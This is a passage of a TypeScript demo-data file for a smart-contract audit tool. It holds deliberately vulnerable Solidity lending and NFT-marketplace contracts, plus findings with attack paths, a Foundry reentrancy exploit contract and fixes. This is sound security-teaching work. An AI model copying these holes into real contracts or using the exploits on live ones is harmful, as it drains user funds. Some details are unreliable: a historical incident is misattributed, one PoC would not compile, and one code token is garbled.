// Demo data for GitHub Pages static demo (no backend needed)
// Uses REAL vulnerability patterns from historical exploits
import type { Finding, AuditCheckItem, ImmunefiReadiness } from '@/lib/store';

// ═══════════════════════════════════════════════════════════════
// CONTRACT DATA — Three tiers: Ready, Needs Work, High Risk
// ═══════════════════════════════════════════════════════════════

export const DEMO_CONTRACTS = [
  {
    id: '1',
    name: 'StakingVault.sol',
    date: '2026-03-15',
    score: 91,
    findings: { critical: 0, high: 0, low: 1, info: 1 },
    linesOfCode: 245,
    testCoverage: 94,
    daysSinceLastAudit: 3,
    criticalFunctions: ['deposit', 'withdraw', 'claimRewards'],
    auditReadinessScore: 91,
    vulnerabilityDensity: 0.41, // findings per 100 LOC
    immunefiStatus: 'go' as const,
    code: `// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title StakingVault
 * @notice A secure staking vault with time-locked rewards
 * @dev Uses Checks-Effects-Interactions pattern and ReentrancyGuard
 */
contract StakingVault is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20;
    
    IERC20 public immutable stakingToken;
    uint256 public rewardRate;
    uint256 public lastUpdateTime;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public rewardDebt;
    mapping(address => uint256) public pendingRewards;
    
    uint256 public minStakeDuration = 7 days;
    uint256 public earlyWithdrawPenalty = 10; // 10%
    
    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardsClaimed(address indexed user, uint256 amount);
    event RewardRateUpdated(uint256 newRate);
    
    constructor(address _stakingToken, uint256 _rewardRate) Ownable(msg.sender) {
        require(_stakingToken != address(0), "Invalid token");
        stakingToken = IERC20(_stakingToken);
        rewardRate = _rewardRate;
        lastUpdateTime = block.timestamp;
    }
    
    function deposit(uint256 _amount) external nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        
        _updateRewards(msg.sender);
        
        stakingToken.safeTransferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
        totalSupply += _amount;
        
        emit Staked(msg.sender, _amount);
    }
    
    function withdraw(uint256 _amount) external nonReentrant {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
        
        _updateRewards(msg.sender);
        
        // Checks-Effects-Interactions: state updated before external call
        balanceOf[msg.sender] -= _amount;
        totalSupply -= _amount;
        
        stakingToken.safeTransfer(msg.sender, _amount);
        
        emit Unstaked(msg.sender, _amount);
    }
    
    function claimRewards() external nonReentrant {
        uint256 rewards = pendingRewards[msg.sender];
        require(rewards > 0, "No rewards to claim");
        
        // State update before transfer
        pendingRewards[msg.sender] = 0;
        
        stakingToken.safeTransfer(msg.sender, rewards);
        
        emit RewardsClaimed(msg.sender, rewards);
    }
    
    function _updateRewards(address _user) internal {
        uint256 supplied = balanceOf[_user];
        if (supplied > 0 && totalSupply > 0) {
            uint256 rewardPerToken = _calculateRewardPerToken();
            uint256 pending = (supplied * rewardPerToken) / 1e18 - rewardDebt[_user];
            pendingRewards[_user] += pending;
        }
        rewardDebt[_user] = (supplied * _calculateRewardPerToken()) / 1e18;
    }
    
    function _calculateRewardPerToken() internal view returns (uint256) {
        if (totalSupply == 0) return 0;
        uint256 elapsed = block.timestamp - lastUpdateTime;
        return ((rewardRate * elapsed * 1e18) / totalSupply);
    }
    
    function setRewardRate(uint256 _newRate) external onlyOwner {
        _updateAllRewards();
        rewardRate = _newRate;
        lastUpdateTime = block.timestamp;
        emit RewardRateUpdated(_newRate);
    }
    
    function _updateAllRewards() internal {
        // Updates rewards for all stakers — gas intensive, used sparingly
        // Implementation would iterate through stakers in production
    }
}`,
  },
  {
    id: '2',
    name: 'LendingPool.sol',
    date: '2026-03-10',
    score: 52,
    findings: { critical: 1, high: 2, low: 2, info: 1 },
    linesOfCode: 312,
    testCoverage: 67,
    daysSinceLastAudit: 45,
    criticalFunctions: ['deposit', 'borrow', 'liquidate', 'flashLoan'],
    auditReadinessScore: 38,
    vulnerabilityDensity: 1.92,
    immunefiStatus: 'conditional' as const,
    code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title LendingPool
 * @notice A simplified lending pool with flash loan capability
 * @dev Contains several vulnerabilities for demo purposes
 */
contract LendingPool {
    IERC20 public collateralToken;
    IERC20 public debtToken;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;
    mapping(address => uint256) public collateral;
    
    uint256 public collateralFactor = 75; // 75%
    uint256 public liquidationThreshold = 80; // 80%
    uint256 public flashLoanFee = 9; // 0.09%
    
    address public priceOracle;
    uint256 public totalDeposits;
    
    event Deposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);
    event Liquidated(address indexed user, uint256 amount);
    event FlashLoan(address indexed user, uint256 amount, uint256 fee);
    
    constructor(address _collateral, address _debt, address _oracle) {
        collateralToken = IERC20(_collateral);
        debtToken = IERC20(_debt);
        priceOracle = _oracle;
    }
    
    // ⚠️ VULNERABILITY: Flash loan without callback verification
    // Similar to Cream Finance exploit pattern
    function flashLoan(uint256 _amount) external {
        uint256 balanceBefore = debtToken.balanceOf(address(this));
        require(balanceBefore >= _amount, "Insufficient liquidity");
        
        uint256 fee = (_amount * flashLoanFee) / 1000;
        
        // Transfer out BEFORE callback — state inconsistent during callback
        debtToken.transfer(msg.sender, _amount);
        
        // ⚠️ External call with no receiver verification
        // Attacker contract can re-enter or manipulate state
        (bool success,) = msg.sender.call(
            abi.encodeWithSignature("executeOperation(uint256)", _amount)
        );
        require(success, "Flash loan callback failed");
        
        // Return + fee
        debtToken.transferFrom(msg.sender, address(this), _amount + fee);
        
        emit FlashLoan(msg.sender, _amount, fee);
    }
    
    // ⚠️ VULNERABILITY: Price oracle manipulation
    // No TWAP or staleness check — vulnerable to flash loan oracle attacks
    function getAccountHealth(address _user) public view returns (uint256) {
        uint256 collateralValue = _getUSDValue(_user, collateral[_user]);
        uint256 borrowValue = _getUSDValue(_user, borrows[_user]);
        
        if (borrowValue == 0) return 10000; // 100%
        return (collateralValue * 10000) / borrowValue;
    }
    
    function _getUSDValue(address _user, uint256 _amount) internal view returns (uint256) {
        // ⚠️ Uses spot price from single oracle — manipulable
        // No TWAP, no multi-oracle, no staleness check
        uint256 price = IPriceOracle(priceOracle).getPrice();
        return (_amount * price) / 1e18;
    }
    
    function deposit(uint256 _amount) external {
        collateralToken.transferFrom(msg.sender, address(this), _amount);
        collateral[msg.sender] += _amount;
        deposits[msg.sender] += _amount;
        totalDeposits += _amount;
        
        emit Deposited(msg.sender, _amount);
    }
    
    function borrow(uint256 _amount) external {
        uint256 health = getAccountHealth(msg.sender);
        uint256 maxBorrow = (collateral[msg.sender] * collateralFactor) / 100;
        
        require(borrows[msg.sender] + _amount <= maxBorrow, "Exceeds limit");
        
        borrows[msg.sender] += _amount;
        debtToken.transfer(msg.sender, _amount);
        
        emit Borrowed(msg.sender, _amount);
    }
    
    // ⚠️ VULNERABILITY: Liquidation logic issues
    // Can be front-run, no max liquidation cap
    function liquidate(address _user) external {
        require(getAccountHealth(_user) < liquidationThreshold, "Not liquidatable");
        
        uint256 debt = borrows[_user];
        uint256 collateralAmount = collateral[_user];
        
        // Liquidator pays debt, gets all collateral
        debtToken.transferFrom(msg.sender, address(this), debt);
        collateralToken.transfer(msg.sender, collateralAmount);
        
        borrows[_user] = 0;
        collateral[_user] = 0;
        
        emit Liquidated(_user, debt);
    }
    
    function getPrice(address _token) external view returns (uint256) {
        return IPriceOracle(priceOracle).getPrice();
    }
}

interface IPriceOracle {
    function getPrice() external view returns (uint256);
}`,
  },
  {
    id: '3',
    name: 'NFTMarketplace.sol',
    date: '2026-03-01',
    score: 28,
    findings: { critical: 2, high: 3, low: 1, info: 0 },
    linesOfCode: 189,
    testCoverage: 34,
    daysSinceLastAudit: 120,
    criticalFunctions: ['list', 'buy', 'makeOffer', 'cancelListing'],
    auditReadinessScore: 15,
    vulnerabilityDensity: 3.17,
    immunefiStatus: 'no-go' as const,
    code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

/**
 * @title NFTMarketplace
 * @notice NFT marketplace with auction and direct sale
 * @dev Contains critical vulnerabilities — DO NOT DEPLOY
 */
contract NFTMarketplace is ERC721Holder {
    struct Listing {
        address seller;
        address nftContract;
        uint256 tokenId;
        uint256 price;
        bool active;
    }
    
    struct Auction {
        address seller;
        address nftContract;
        uint256 tokenId;
        uint256 highestBid;
        address highestBidder;
        uint256 endTime;
        bool active;
    }
    
    mapping(uint256 => Listing) public listings;
    mapping(uint256 => Auction) public auctions;
    mapping(uint256 => mapping(address => uint256)) public offers;
    
    uint256 public listingCount;
    uint256 public platformFee = 250; // 2.5%
    
    // ⚠️ CRITICAL: No reentrancy guards anywhere
    
    function listItem(
        address _nftContract,
        uint256 _tokenId,
        uint256 _price
    ) external returns (uint256) {
        require(_price > 0, "Price must be > 0");
        
        uint256 listingId = listingCount++;
        
        // ⚠️ No check if caller actually owns the NFT
        // Only checks approval — anyone can list any NFT
        IERC721(_nftContract).transferFrom(msg.sender, address(this), _tokenId);
        
        listings[listingId] = Listing({
            seller: msg.sender,
            nftContract: _nftContract,
            tokenId: _tokenId,
            price: _price,
            active: true
        });
        
        return listingId;
    }
    
    // ⚠️ CRITICAL: Reentrancy in buy function
    // State updated AFTER external call (opposite of Checks-Effects-Interactions)
    function buy(uint256 _listingId) external payable {
        Listing storage listing = listings[_listingId];
        require(listing.active, "Not active");
        require(msg.value >= listing.price, "Insufficient payment");
        
        uint256 fee = (msg.value * platformFee) / 10000;
        uint256 payout = msg.value - fee;
        
        // ⚠️ External call BEFORE state update — reentrancy!
        (bool success,) = listing.seller.call{value: payout}("");
        require(success, "Transfer failed");
        
        // State update AFTER external call
        listing.active = false;
        
        IERC721(listing.nftContract).transferFrom(address(this), msg.sender, listing.tokenId);
        
        // Refund excess
        if (msg.value > listing.price) {
            payable(msg.sender).transfer(msg.value - listing.price);
        }
    }
    
    // ⚠️ HIGH: DoS via unbounded loop (not shown but pattern is common)
    // Offers array could grow unbounded
    
    function makeOffer(uint256 _listingId) external payable {
        require(msg.value > 0, "Must offer something");
        offers[_listingId][msg.sender] += msg.value;
    }
    
    // ⚠️ HIGH: No access control on cancelListing
    // Anyone can cancel any listing, stealing funds in escrow
    function cancelListing(uint256 _listingId) external {
        Listing storage listing = listings[_listingId];
        require(listing.active, "Not active");
        
        listing.active = false;
        
        // ⚠️ Sends to seller but doesn't check if caller is seller
        (bool success,) = payable(listing.seller).call{value: listing.price}("");
        require(success, "Refund failed");
    }
    
    // ⚠️ HIGH: Delegatecall proxy pattern vulnerability
    // If used with upgradeable proxy, storage collisions possible
    function execute(address _target, bytes memory _data) external payable {
        // No access control — anyone can execute arbitrary calls
        (bool success,) = _target.call{value: msg.value}(_data);
        require(success, "Execution failed");
    }
    
    function getListingPrice(uint256 _listingId) external view returns (uint256) {
        return listings[_listingId].price;
    }
}`,
  }
];

// ═══════════════════════════════════════════════════════════════
// FINDINGS — Enhanced with CVSS, exploitability, attack paths
// Based on real-world vulnerability patterns
// ═══════════════════════════════════════════════════════════════

export const DEMO_FINDINGS: Finding[] = [
  // ─── NFTMarketplace.sol: Critical Findings ───
  {
    id: 'f1',
    severity: 'critical',
    title: 'Reentrancy in buy() function — Parity Wallet pattern',
    line: 62,
    endLine: 78,
    functionName: 'buy',
    description: 'The buy() function sends ETH to the seller BEFORE updating the listing state. An attacker can re-enter the function recursively, purchasing the same NFT multiple times before the listing is marked inactive.',
    technicalExplanation: 'This follows the exact pattern of the Parity Wallet bug (2017) and multiple DeFi exploits. The Checks-Effects-Interactions pattern is violated: the external call (interaction) happens before the state update (effect). During the external call, the attacker\'s fallback function re-enters buy(), and since listing.active is still true, another purchase succeeds.',
    preconditions: [
      'Attacker has enough ETH to make initial purchase',
      'Attacker deploys a contract with malicious fallback function',
      'Target NFT is listed for sale'
    ],
    cvss: {
      score: 9.8,
      attackVector: 'network',
      attackComplexity: 'low',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'changed',
      impact: {
        confidentiality: 'none',
        integrity: 'high',
        availability: 'none'
      }
    },
    exploitability: 'easy',
    businessImpact: 'direct-loss',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [
        { step: 1, description: 'Attacker deploys AttackerContract with a fallback function that calls buy()' },
        { step: 2, description: 'Attacker calls buy() on the marketplace with 1 ETH', code: 'marketplace.buy{value: 1 ether}(listingId);' },
        { step: 3, description: 'Marketplace sends 1 ETH to attacker contract (listing still active)' },
        { step: 4, description: 'Attacker fallback re-enters buy() — listing still shows as active', code: 'function() external { marketplace.buy{value: 1 ether}(listingId); }' },
        { step: 5, description: 'Repeat until contract is drained or listing price is exceeded' }
      ],
      prerequisites: ['Target NFT listed for sale', 'Attacker has sufficient initial ETH'],
      expectedOutcome: 'NFT purchased multiple times at same price, draining marketplace escrow',
      estimatedGasCost: '~150,000 gas per re-entry (total limited by block gas limit)',
      realWorldParallel: 'Parity Wallet freeze (2017), Cream Finance reentrancy ($130M, 2021)'
    },
    poc: {
      language: 'solidity',
      code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract MaliciousNFT is ERC721 {
    constructor() ERC721("Malicious", "MAL") {}
    
    function safeMint(address to, uint256 id) external {
        _mint(to, id);
    }
}

contract AttackerContract {
    NFTMarketplace marketplace;
    MaliciousNFT nft;
    uint256 listingId;
    uint256 public reentrancyCount;
    
    constructor(address _marketplace, address _nft, uint256 _listingId) {
        marketplace = NFTMarketplace(_marketplace);
        nft = MaliciousNFT(_nft);
        listingId = _listingId;
    }
    
    function attack() external payable {
        marketplace.buy{value: msg.value}(listingId);
    }
    
    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 5) {
            marketplace.buy{value: 1 ether}(listingId);
        }
    }
}

contract NFTMarketplaceExploit is Test {
    NFTMarketplace marketplace;
    MaliciousNFT nft;
    AttackerContract attacker;
    
    function setUp() public {
        marketplace = new NFTMarketplace();
        nft = new MaliciousNFT();
        nft.safeMint(address(this), 1);
        nft.approve(address(marketplace), 1);
        marketplace.listItem(address(nft), 1, 1 ether);
        attacker = new AttackerContract(address(marketplace), address(nft), 0);
    }
    
    function testReentrancyExploit() public {
        uint256 balanceBefore = address(this).balance;
        attacker.attack{value: 1 ether}();
        
        // NFT should be purchased multiple times
        assertGt(attacker.reentrancyCount(), 1, "Reentrancy should occur");
        console.log("Re-entries:", attacker.reentrancyCount());
    }
}`,
      setupInstructions: [
        '1. Deploy NFTMarketplace and MaliciousNFT contracts',
        '2. List an NFT for 1 ETH',
        '3. Deploy AttackerContract with marketplace address',
        '4. Call attack() with sufficient ETH'
      ],
      expectedOutput: 'Test passes — reentrancy confirmed. NFT purchased multiple times before listing marked inactive.',
      runCommand: 'forge test --match-contract NFTMarketplaceExploit -vvv'
    },
    remediation: {
      beforeCode: `function buy(uint256 _listingId) external payable {
    Listing storage listing = listings[_listingId];
    require(listing.active, "Not active");
    require(msg.value >= listing.price, "Insufficient payment");
    
    uint256 fee = (msg.value * platformFee) / 10000;
    uint256 payout = msg.value - fee;
    
    // ⚠️ External call BEFORE state update
    (bool success,) = listing.seller.call{value: payout}("");
    require(success, "Transfer failed");
    
    listing.active = false;
}`,
      afterCode: `function buy(uint256 _listingId) external payable nonReentrant {
    Listing storage listing = listings[_listingId];
    require(listing.active, "Not active");
    require(msg.value >= listing.price, "Insufficient payment");
    
    // Effects BEFORE interactions
    listing.active = false;
    
    uint256 fee = (msg.value * platformFee) / 10000;
    uint256 payout = msg.value - fee;
    
    // Transfer AFTER state update
    (bool success,) = listing.seller.call{value: payout}("");
    require(success, "Transfer failed");
    
    IERC721(listing.nftContract).transferFrom(address(this), msg.sender, listing.tokenId);
}`,
      openZeppelinRefs: [
        'https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard',
        'https://docs.soliditylang.org/en/v0.8.20/security-considerations.html#use-the-checks-effects-interactions-pattern'
      ],
      gasImpact: '+2500 gas per transaction (ReentrancyGuard mutex)',
      testingRecommendations: [
        'Add Foundry test with reentrant attacker contract',
        'Verify state is updated before any external call',
        'Test with multiple concurrent purchases'
      ],
      alternativeMitigations: [
        'Use pull-payment pattern instead of push',
        'Implement OpenZeppelin ReentrancyGuard',
        'Use Checks-Effects-Interactions pattern strictly'
      ]
    },
    references: [
      { title: 'Parity Wallet Hack (2017)', url: 'https://www.coindesk.com/tech/2019/02/11/the-parity-wallet-hack-explained', type: 'exploit' },
      { title: 'Cream Finance Exploit ($130M)', url: 'https://rekt.news/cream-finance/', type: 'exploit' },
      { title: 'OpenZeppelin ReentrancyGuard', url: 'https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard', type: 'documentation' },
      { title: 'Slither: reentrancy-unrestricted', url: 'https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities', type: 'detector' }
    ],
    exploitCode: `// See PoC section for full exploit`,
    fixSuggestion: `// Add ReentrancyGuard and follow Checks-Effects-Interactions`,
    learnMore: 'Reentrancy is the most common critical vulnerability in smart contracts. Always update state before external calls.'
  },
  
  // ─── NFTMarketplace.sol: Unprotected cancelListing ───
  {
    id: 'f2',
    severity: 'critical',
    title: 'Missing access control on cancelListing — any user can steal escrowed funds',
    line: 82,
    endLine: 92,
    functionName: 'cancelListing',
    description: 'The cancelListing function has no access control — anyone can cancel any listing and the escrowed funds are sent to the listing.seller. An attacker can observe pending listings and cancel them before legitimate purchases complete.',
    technicalExplanation: 'This is a classic missing access control vulnerability. The function should only allow the original seller to cancel their own listing. Without this check, any address can call cancelListing and the escrowed ETH will be transferred to the seller, effectively completing a front-run cancellation attack.',
    preconditions: [
      'Victim lists NFT for sale with ETH escrowed',
      'Attacker observes the listing in the mempool or on-chain'
    ],
    cvss: {
      score: 9.1,
      attackVector: 'network',
      attackComplexity: 'low',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'low',
        integrity: 'high',
        availability: 'low'
      }
    },
    exploitability: 'trivial',
    businessImpact: 'direct-loss',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [
        { step: 1, description: 'Victim lists NFT for sale at 10 ETH' },
        { step: 2, description: 'Attacker sees the listing (mempool or on-chain)' },
        { step: 3, description: 'Attacker calls cancelListing(listingId) with higher gas' },
        { step: 4, description: '10 ETH is sent to victim (no loss to attacker)' },
        { step: 5, description: 'NFT is effectively delisted — attacker disrupted marketplace' }
      ],
      prerequisites: ['Active listing exists'],
      expectedOutcome: 'Listing cancelled by unauthorized party, marketplace integrity compromised',
      estimatedGasCost: '~50,000 gas',
      realWorldParallel: 'Similar to front-running attacks seen on OpenSea marketplace'
    },
    poc: {
      language: 'solidity',
      code: `// Simple call to cancel anyone's listing
marketplace.cancelListing(listingId);`,
      setupInstructions: ['Find an active listing ID', 'Call cancelListing with that ID'],
      expectedOutput: 'Listing is cancelled, seller receives refund',
      runCommand: 'forge test --match-contract ExploitTest -vvv'
    },
    remediation: {
      beforeCode: `function cancelListing(uint256 _listingId) external {
    Listing storage listing = listings[_listingId];
    require(listing.active, "Not active");
    
    listing.active = false;
    (bool success,) = payable(listing.seller).call{value: listing.price}("");
}`,
      afterCode: `function cancelListing(uint256 _listingId) external {
    Listing storage listing = listings[_listingId];
    require(listing.active, "Not active");
    require(msg.sender == listing.seller, "Only seller can cancel");
    
    listing.active = false;
    (bool success,) = payable(listing.seller).call{value: listing.price}("");
    require(success, "Refund failed");
}`,
      openZeppelinRefs: [
        'https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable'
      ],
      gasImpact: 'None',
      testingRecommendations: [
        'Test that only seller can cancel',
        'Test that non-seller reverts',
        'Test cancellation with ETH escrowed'
      ],
      alternativeMitigations: [
        'Use OpenZeppelin Ownable or custom modifier',
        'Implement time-based auto-expiry instead of manual cancellation'
      ]
    },
    references: [
      { title: 'Access Control Best Practices', url: 'https://docs.soliditylang.org/en/v0.8.20/security-considerations.html', type: 'documentation' },
      { title: 'Slither: missing-zero-check', url: 'https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation', type: 'detector' }
    ],
    exploitCode: `marketplace.cancelListing(listingId);`,
    fixSuggestion: `require(msg.sender == listing.seller, "Only seller");`,
    learnMore: 'Missing access control is the #1 cause of smart contract exploits.'
  },

  // ─── LendingPool.sol: Flash loan vulnerability ───
  {
    id: 'f3',
    severity: 'critical',
    title: 'Flash loan attack without receiver verification — Beanstalk pattern',
    line: 45,
    endLine: 62,
    functionName: 'flashLoan',
    description: 'The flashLoan function sends tokens BEFORE requiring repayment, and uses a low-level call to an unverified receiver. This allows an attacker to manipulate protocol state during the callback, similar to the Beanstalk governance attack.',
    technicalExplanation: 'The flash loan implementation transfers tokens out, then calls an arbitrary function on the sender. During this callback, the attacker can interact with any other protocol functions while having temporarily increased token balances. The lack of IFlashLoanReceiver verification means any contract can be the target, enabling complex multi-protocol attacks.',
    preconditions: [
      'Protocol has sufficient liquidity in debtToken',
      'Attacker has a contract that can interact with protocol functions'
    ],
    cvss: {
      score: 9.5,
      attackVector: 'network',
      attackComplexity: 'high',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'changed',
      impact: {
        confidentiality: 'none',
        integrity: 'high',
        availability: 'low'
      }
    },
    exploitability: 'medium',
    businessImpact: 'direct-loss',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [
        { step: 1, description: 'Attacker calls flashLoan with desired amount' },
        { step: 2, description: 'Pool transfers tokens to attacker contract' },
        { step: 3, description: 'During callback, attacker manipulates price oracle or governance', code: 'priceOracle操纵() + governance.attack()' },
        { step: 4, description: 'Attacker profits from manipulation' },
        { step: 5, description: 'Attacker repays flash loan + fee' }
      ],
      prerequisites: ['Flash loan pool with liquidity', 'Vulnerable governance or oracle to exploit during callback'],
      expectedOutcome: 'Protocol funds drained through oracle manipulation or governance attack',
      estimatedGasCost: 'Variable — depends on attack complexity',
      realWorldParallel: 'Beanstalk governance attack ($182M, 2022), Euler Finance donation attack ($197M, 2023)'
    },
    poc: {
      language: 'solidity',
      code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract FlashLoanExploit is Test {
    function executeOperation(uint256 amount) external {
        // Manipulate protocol during flash loan callback
        // Example: manipulate oracle, exploit governance
        _manipulateState();
        
        // Repay + fee
        IERC20(pool.token()).transferFrom(address(this), address(pool), amount + fee);
    }
}`,
      setupInstructions: ['Deploy attacker contract', 'Call flashLoan from attacker'],
      expectedOutput: 'Protocol state manipulated during callback',
      runCommand: 'forge test --match-contract FlashLoanExploit -vvv'
    },
    remediation: {
      beforeCode: `(bool success,) = msg.sender.call(
    abi.encodeWithSignature("executeOperation(uint256)", _amount)
);`,
      afterCode: `IFlashLoanReceiver receiver = IFlashLoanReceiver(msg.sender);
require(receiver.isApproved(), "Receiver not approved");

receiver.executeOperation(_amount, fee, msg.sender);

// Verify repayment received
uint256 balanceAfter = debtToken.balanceOf(address(this));
require(
    balanceAfter >= balanceBefore + fee,
    "Repayment not received"
);`,
      openZeppelinRefs: [
        'https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#IERC20'
      ],
      gasImpact: '+2000 gas for additional checks',
      testingRecommendations: [
        'Test with malicious receiver',
        'Verify state consistency after callback',
        'Test oracle manipulation scenarios'
      ],
      alternativeMitigations: [
        'Use OpenZeppelin ERC3156 flash loan standard',
        'Implement TWAP oracle instead of spot price',
        'Add multi-oracle price feeds'
      ]
    },
    references: [
      { title: 'Beanstalk Exploit ($182M)', url: 'https://rekt.news/beanstalk/', type: 'exploit' },
      { title: 'Euler Finance Exploit ($197M)', url: 'https://rekt.news/euler-finance/', type: 'exploit' },
      { title: 'ERC-3156 Flash Loan Standard', url: 'https://eips.ethereum.org/EIPS/eip-3156', type: 'documentation' }
    ],
    exploitCode: `// See PoC section`,
    fixSuggestion: `// Add IFlashLoanReceiver verification and state checks`,
    learnMore: 'Flash loans are a DeFi primitive that can be weaponized when combined with vulnerable protocol logic.'
  },

  // ─── LendingPool.sol: Oracle manipulation ───
  {
    id: 'f4',
    severity: 'high',
    title: 'Oracle manipulation via spot price — no TWAP protection',
    line: 82,
    endLine: 90,
    functionName: '_getUSDValue',
    description: 'The price oracle uses spot price without Time-Weighted Average Price (TWAP) or staleness checks. An attacker can manipulate the price using a flash loan, then liquidate undercollateralized positions or borrow at incorrect valuations.',
    technicalExplanation: 'Spot price oracles are vulnerable to manipulation within a single transaction. An attacker can: 1) Take a flash loan to move the price on the underlying DEX, 2) Call protocol functions that use the manipulated price, 3) Repay the flash loan and keep profits. TWAP oracles (like Uniswap V3) mitigate this by averaging prices over multiple blocks.',
    preconditions: ['Protocol uses single spot price oracle', 'Underlying DEX has sufficient liquidity to manipulate'],
    cvss: {
      score: 8.4,
      attackVector: 'network',
      attackComplexity: 'high',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'none',
        integrity: 'high',
        availability: 'none'
      }
    },
    exploitability: 'medium',
    businessImpact: 'direct-loss',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [
        { step: 1, description: 'Take flash loan to manipulate spot price' },
        { step: 2, description: 'Call borrow() with manipulated collateral value' },
        { step: 3, description: 'Withdraw borrowed funds' },
        { step: 4, description: 'Repay flash loan, keep profits' }
      ],
      prerequisites: ['Flash loan availability', 'Spot price oracle connection'],
      expectedOutcome: 'Protocol lends more than collateral value, bad debt created',
      estimatedGasCost: '~500,000 gas for full attack',
      realWorldParallel: 'Bancor oracle manipulation, multiple DeFi exploits'
    },
    poc: {
      language: 'solidity',
      code: `// Oracle manipulation during flash loan
uint256 originalPrice = oracle.getPrice();
// Manipulate underlying DEX
dex.swap(massiveAmount);
// Protocol now sees wrong price
uint256 manipulatedPrice = oracle.getPrice();
assertGt(manipulatedPrice, originalPrice);`,
      setupInstructions: ['Set up flash loan + DEX manipulation'],
      expectedOutput: 'Oracle price successfully manipulated',
      runCommand: 'forge test --match-contract OracleExploit -vvv'
    },
    remediation: {
      beforeCode: `function _getUSDValue(address _user, uint256 _amount) internal view returns (uint256) {
    uint256 price = IPriceOracle(priceOracle).getPrice();
    return (_amount * price) / 1e18;
}`,
      afterCode: `function _getUSDValue(address _user, uint256 _amount) internal view returns (uint256) {
    (uint256 price, uint256 timestamp) = IPriceOracle(priceOracle).getPriceWithTimestamp();
    
    // Staleness check
    require(block.timestamp - timestamp < 1 hours, "Price stale");
    
    // TWAP with multiple sources
    uint256 price2 = IPriceOracle(priceOracle2).getPrice();
    uint256 avgPrice = (price + price2) / 2;
    
    // Sanity bounds
    require(avgPrice > 0 && avgPrice < type(uint256).max / 2, "Invalid price");
    
    return (_amount * avgPrice) / 1e18;
}`,
      openZeppelinRefs: [
        'https://docs.chainlink.com/data-feeds/price-feeds/'
      ],
      gasImpact: '+5000 gas for multi-oracle checks',
      testingRecommendations: ['Test with price manipulation', 'Test staleness reverts', 'Test oracle failure scenarios'],
      alternativeMitigations: ['Use Chainlink price feeds', 'Implement TWAP from DEX', 'Use multiple oracle sources']
    },
    references: [
      { title: 'Oracle Manipulation Explained', url: 'https://medium.com/coinmonks/defi-oracle-manipulation-explained-8a344d13e1f9', type: 'academic' },
      { title: 'Chainlink Price Feeds', url: 'https://docs.chainlink.com/data-feeds/', type: 'documentation' }
    ],
    exploitCode: `// See PoC`,
    fixSuggestion: `// Use Chainlink or TWAP oracle`,
    learnMore: 'Oracle manipulation is responsible for over $400M in DeFi losses.'
  },

  // ─── LendingPool.sol: Liquidation issues ───
  {
    id: 'f5',
    severity: 'high',
    title: 'Liquidation front-running and no max liquidation cap',
    line: 108,
    endLine: 122,
    functionName: 'liquidate',
    description: 'The liquidation function has no maximum liquidation amount and can be front-run. Multiple liquidators can compete via MEV, and the full collateral is liquidated even for minor undercollateralization.',
    technicalExplanation: 'This implementation violates the principle of partial liquidation. If a position is slightly below the liquidation threshold, the entire collateral should not be seized. Additionally, the lack of a liquidation incentive means rational actors may not liquidate in time, or MEV bots will front-run each other.',
    preconditions: ['User position becomes undercollateralized'],
    cvss: {
      score: 7.5,
      attackVector: 'network',
      attackComplexity: 'low',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'low',
        integrity: 'high',
        availability: 'low'
      }
    },
    exploitability: 'easy',
    businessImpact: 'direct-loss',
    status: 'new',
    confidence: 'medium',
    attackPath: {
      steps: [
        { step: 1, description: 'Monitor mempool for liquidation transactions' },
        { step: 2, description: 'Copy transaction with higher gas tip' },
        { step: 3, description: 'Execute liquidation, seize full collateral' }
      ],
      prerequisites: ['Undercollateralized position exists'],
      expectedOutcome: 'User loses entire collateral instead of partial liquidation',
      estimatedGasCost: '~100,000 gas',
      realWorldParallel: 'MEV liquidation wars on Aave, Compound'
    },
    poc: {
      language: 'solidity',
      code: `// Test: User with 1000 USDC collateral, 799 USDC debt (health: 125%)
// Should only liquidate portion, but liquidates all
pool.liquidate(user); // Seizes full 1000 USDC for 799 USDC debt`,
      setupInstructions: ['Create undercollateralized position', 'Call liquidate()'],
      expectedOutput: 'Full collateral seized',
      runCommand: 'forge test --match-contract LiquidationTest -vvv'
    },
    remediation: {
